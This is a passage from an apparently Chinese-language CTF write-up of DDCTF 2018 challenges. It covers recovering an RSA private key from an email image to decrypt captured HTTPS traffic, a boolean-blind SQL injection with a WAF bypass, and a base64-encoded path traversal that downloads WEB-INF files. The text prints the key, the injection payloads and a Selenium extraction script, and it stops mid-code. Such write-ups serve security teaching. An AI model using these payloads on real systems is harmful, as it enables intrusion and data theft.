class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-type: image/png; name=&quot;image001.png&quot;;</span><br><span class=\"line\"> x-mac-creator=&quot;4F50494D&quot;;</span><br><span class=\"line\"> x-mac-type=&quot;504E4766&quot;</span><br><span class=\"line\">Content-ID: &lt;image001.png@01D38B05.8079CE40&gt;</span><br><span class=\"line\">Content-disposition: inline;</span><br><span class=\"line\">\tfilename=&quot;image001.png&quot;</span><br><span class=\"line\">Content-transfer-encoding: base64</span><br></pre></td></tr></table></figure>\n<p>下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;1.txt&quot;, &quot;r&quot;)</span><br><span class=\"line\">fp1 = open(&quot;file.png&quot;, &quot;wb&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp1.write(base64.b64decode(fp.read()))</span><br></pre></td></tr></table></figure>\n<p>然后，就可以得到一个file.png。</p>\n<p><img src=\"/assets/ddctf/20180425151942.png\" alt=\"avatar\"></p>\n<p>然后，就是将图片中的字符串提取出来。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class=\"line\">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class=\"line\">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class=\"line\">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class=\"line\">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class=\"line\">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class=\"line\">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class=\"line\">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class=\"line\">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class=\"line\">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class=\"line\">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class=\"line\">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class=\"line\">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br></pre></td></tr></table></figure>\n<p>再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。</p>\n<p>一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。</p>\n<h2 id=\"得到flag\"><a href=\"#得到flag\" class=\"headerlink\" title=\"得到flag\"></a>得到flag</h2><p>今天是ddctf最后一天，”喝杯java”，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。</p>\n<p>rsa密钥也就是，保存一下就行了:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class=\"line\">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class=\"line\">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class=\"line\">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class=\"line\">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class=\"line\">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class=\"line\">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class=\"line\">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class=\"line\">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class=\"line\">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class=\"line\">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class=\"line\">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class=\"line\">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ddctf/20180420184445.png\" alt=\"avatar\"></p>\n<p>然后，查看http包，flag就出来了。</p>\n<p><img src=\"/assets/ddctf/20180420183706.png\" alt=\"avatar\"></p>\n<h1 id=\"数据库的秘密\"><a href=\"#数据库的秘密\" class=\"headerlink\" title=\"数据库的秘密\"></a>数据库的秘密</h1><h2 id=\"X-forwarded-for\"><a href=\"#X-forwarded-for\" class=\"headerlink\" title=\"X-forwarded-for\"></a>X-forwarded-for</h2><p>首先打开网页，可以看到”非法链接，只允许来自 123.232.23.245 的访问”,很容易就想到修改X-forwarded-for, Chrome下我使用<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件,然后修改一下X-forwarded-for就行了</p>\n<h2 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h2><p>既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。</p>\n<ul>\n<li>id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。</li>\n<li>title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。</li>\n<li>author<ul>\n<li>“admin”, 会得到author 为 “admin” 的两条记录</li>\n<li>“admin’”, 一条记录都没有</li>\n<li>“admin’#”, 同样会得到author 为 “admin” 的两条记录，那注入点应该就是这里了。</li>\n<li>“admin’ and 1=1#”, 发现会有网站防火墙拦截，应该是”and”被拦截，可以使用”&amp;&amp;”来替换”and”,然后，同样会查询出两条记录。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>找到注入点之后，就好办了。</p>\n<ul>\n<li>“admin’ order by 6#”, 失败，”admin’ order by 5#”，成功查询，那就是5列了。 </li>\n<li>“admin’ union select 1,2,3,4,5#”, 被防火墙拦截，然后就是各种测试”union select”,没能成功绕过(比赛结束之后，有师傅说可以绕过，<a href=\"https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">链接</a>，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。</li>\n<li>“admin’ &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)&lt;’z’)#”,成功拿到数据，接下来就是写脚本拿flag了。<br>脚本如下:</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from selenium import webdriver</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">strings = string.ascii_letters + string.punctuation + string.digits</span><br><span class=\"line\">string_value = &quot;,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class=\"line\">url=&quot;http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php&quot;</span><br><span class=\"line\">path=&quot;D:\\\\python\\\\chromedriver.exe&quot;</span><br><span class=\"line\">driver = webdriver.Chrome(executable_path=path)</span><br><span class=\"line\">payload = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_table = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos;),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_column = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;ctf_key7&apos;),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_value = &quot;admin&apos; &amp;&amp; 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord(&apos;%s&apos;))#&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">def inject():</span><br><span class=\"line\">    data = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\">    input(&quot;jixu:&quot;)</span><br><span class=\"line\">    judge = True</span><br><span class=\"line\">    index = 1</span><br><span class=\"line\">    while judge:</span><br><span class=\"line\">        judge_temp = False</span><br><span class=\"line\">        for i in string_value:</span><br><span class=\"line\">            payload_temp = payload_value % (index, i)</span><br><span class=\"line\">            print(payload_temp)</span><br><span class=\"line\">            driver.get(url)</span><br><span class=\"line\">            driver.execute_script(&apos;document.getElementById(&quot;author&quot;).type=&quot;text&quot;&apos;)</span><br><span class=\"line\">            driver.find_element_by_id(&quot;author&quot;).send_keys(payload_temp)</span><br><span class=\"line\">            driver.find_element_by_id(&quot;button&quot;).click()</span><br><span class=\"line\">            if &quot;admin&quot; in driver.page_source:</span><br><span class=\"line\">                data += i</span><br><span class=\"line\">                index += 1</span><br><span class=\"line\">                judge_temp = True</span><br><span class=\"line\">                print(data)</span><br><span class=\"line\">                break</span><br><span class=\"line\">            time.sleep(1)</span><br><span class=\"line\">        if judge_temp is not True:</span><br><span class=\"line\">            driver.close()</span><br><span class=\"line\">\t\t\tjudge = False</span><br><span class=\"line\"></span><br><span class=\"line\">inject(payload_value)</span><br><span class=\"line\"># table_schema:  ddctf</span><br><span class=\"line\"># tables: ctf_key7, message</span><br><span class=\"line\"># columns: ctf_key7下: secvalue，flag就保存在sevalue里边</span><br></pre></td></tr></table></figure>\n<h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li><p>每次请求时，js都会计算一个sig值和time值，计算方法在main.js中</p>\n <figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span>(ca?<span class=\"string\">\"\"</span>:e(<span class=\"built_in\">parseInt</span>(c/a)))+((c=c%a)<span class=\"number\">35</span>?<span class=\"built_in\">String</span>.fromCharCode(c+<span class=\"number\">29</span>):c.toString(<span class=\"number\">36</span>))&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\w+'</span>&#125;;c=<span class=\"number\">1</span>;&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\b'</span>+e(c)+<span class=\"string\">'\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p;&#125;(<span class=\"string\">'e f(0,4)&#123;5 7='</span><span class=\"string\">';l(i m 0)&#123;n(i!='</span>c<span class=\"string\">')&#123;a='</span><span class=\"string\">';a=i+'</span>=<span class=\"string\">'+0[i];7+=a&#125;&#125;o k(7+4)&#125;;5 0=&#123;8:'</span><span class=\"string\">',9:'</span><span class=\"string\">',b:'</span><span class=\"string\">',6:'</span><span class=\"string\">',d:h(j v().u()/w)&#125;;e x()&#123;0['</span><span class=\"number\">8</span><span class=\"string\">']=1.2('</span><span class=\"number\">8</span><span class=\"string\">').3;0['</span><span class=\"number\">9</span><span class=\"string\">']=1.2('</span><span class=\"number\">9</span><span class=\"string\">').3;0['</span>b<span class=\"string\">']=1.2('</span>b<span class=\"string\">').3;0['</span><span class=\"number\">6</span><span class=\"string\">']=1.2('</span><span class=\"number\">6</span><span class=\"string\">').3;5 c=f(0,4);1.2('</span>g<span class=\"string\">').q=\"p.s?r=\"+c+\"&amp;d=\"+0.d;1.2('</span>g<span class=\"string\">').t()&#125;'</span>,<span class=\"number\">34</span>,<span class=\"number\">34</span>,<span class=\"string\">'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>\n<p> 看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。</p>\n</li>\n<li><p>由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">driver.get(url)</span><br><span class=\"line\">input(&quot;jixu:&quot;)</span><br></pre></td></tr></table></figure>\n<p> 首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。</p>\n</li>\n</ul>\n<h1 id=\"专属链接\"><a href=\"#专属链接\" class=\"headerlink\" title=\"专属链接\"></a>专属链接</h1><h2 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h2><p>首先F12抓包，会看到一个有意思的请求，<a href=\"http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you\" target=\"_blank\" rel=\"noopener\">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you</a> can only download .class .xml .ico .ks files”,表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。</p>\n<p><img src=\"/assets/ddctf/20180421191033.png\" alt=\"avatar\"></p>\n<p>其中需要注意的有三个文件，</p>\n<ul>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造”116.85.48.102:5050/flag/test/flag/DDCTF{BASD}”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/assets/ddctf/201804211191034.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造”116.85.48.102:5050/image/banner/[随便一个错误的地址]”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/assets/ddctf/20180421191037.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过”116.85.48.102:5050/base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)”,(注意，base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。</p>\n</li>\n</ul>\n<h2 id=\"审计代码\"><a href=\"#审计代码\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。<br>其中最重要的两个文件是FlagController.class和InitListener.class。</p>\n<ul>\n<li>FlagController.class</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123;</span><br><span class=\"line\">        Flag flag = this.flagService.getFlagByEmail(email);</span><br><span class=\"line\">        return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。</p>\n<ul>\n<li>InitListener.class</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void onApplicationEvent(ApplicationEvent event) &#123;</span><br><span class=\"line\">        if(event.getSource() instanceof ApplicationContext) &#123;</span><br><span class=\"line\">            WebApplicationContext ctx = (WebApplicationContext)event.getSource();</span><br><span class=\"line\">            if(ctx.getParent() == null) &#123;</span><br><span class=\"line\">                String regenflag = this.properties.getProperty(&quot;regenflag&quot;);</span><br><span class=\"line\">                if(regenflag != null &amp;&amp; &quot;false&quot;.equals(regenflag)) &#123;</span><br><span class=\"line\">                    System.out.println(&quot;skip gen flag&quot;);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    try &#123;</span><br><span class=\"line\">                        this.flagService.deleteAll();</span><br><span class=\"line\">                        int id = 1;</span><br><span class=\"line\">                        String path = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/emails.txt&quot;);</span><br><span class=\"line\">                        String ksPath = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/sdl.ks&quot;);</span><br><span class=\"line\">                        System.out.println(path);</span><br><span class=\"line\">                        String emailsString = FileUtils.readFileToString(new File(path), &quot;utf-8&quot;);</span><br><span class=\"line\">                        String[] emails = emailsString.trim().split(&quot;\\n&quot;);</span><br><span class=\"line\">                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">                        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">                        keyStore.load(inputStream, this.p.toCharArray());</span><br><span class=\"line\">                        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, this.p.toCharArray());</span><br><span class=\"line\">                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">                        cipher.init(1, key);</span><br><span class=\"line\">                        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class=\"line\">                        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">                        mac.init(signingKey);</span><br><span class=\"line\">                        SecureRandom sr = new SecureRandom();</span><br><span class=\"line\">                        String[] var16 = emails;</span><br><span class=\"line\">                        int var17 = emails.length;</span><br><span class=\"line\"></span><br><span class=\"line\">                        for(int var18 = 0; var18 &lt; var17; ++var18) &#123;</span><br><span class=\"line\">                            String email = var16[var18];</span><br><span class=\"line\">                            String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class=\"line\">                            String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class=\"line\">                            byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class=\"line\">                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">                            Flag flago = new Flag();</span><br><span class=\"line\">                            flago.setId(Integer.valueOf(id));</span><br><span class=\"line\">                            flago.setFlag(byte2hex(data));</span><br><span class=\"line\">                            flago.setEmail(byte2hex(e));</span><br><span class=\"line\">                            flago.setOriginFlag(flag);</span><br><span class=\"line\">                            flago.setUuid(uuid);</span><br><span class=\"line\">                            flago.setOriginEmail(email);</span><br><span class=\"line\">                            this.flagService.save(flago);</span><br><span class=\"line\">                            System.out.println(email + &quot;同学的入口链接为：http://116.85.48.102:5050/welcom/&quot; + uuid);</span><br><span class=\"line\">                            ++id;</span><br><span class=\"line\">                            System.out.println(flago);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; catch (KeyStoreException var25) &#123;</span><br><span class=\"line\">                        var25.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (IOException var26) &#123;</span><br><span class=\"line\">                        var26.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (NoSuchAlgorithmException var27) &#123;</span><br><span class=\"line\">                        var27.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (CertificateException var28) &#123;</span><br><span class=\"line\">                        var28.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (UnrecoverableKeyException var29) &#123;</span><br><span class=\"line\">                        var29.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (NoSuchPaddingException var30) &#123;</span><br><span class=\"line\">                        var30.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (InvalidKeyException var31) &#123;</span><br><span class=\"line\">                        var31.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (IllegalBlockSizeException var32) &#123;</span><br><span class=\"line\">                        var32.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (BadPaddingException var33) &#123;</span><br><span class=\"line\">                        var33.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。</p>\n<h2 id=\"获取flag\"><a href=\"#获取flag\" class=\"headerlink\" title=\"获取flag\"></a>获取flag</h2><ul>\n<li>生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span 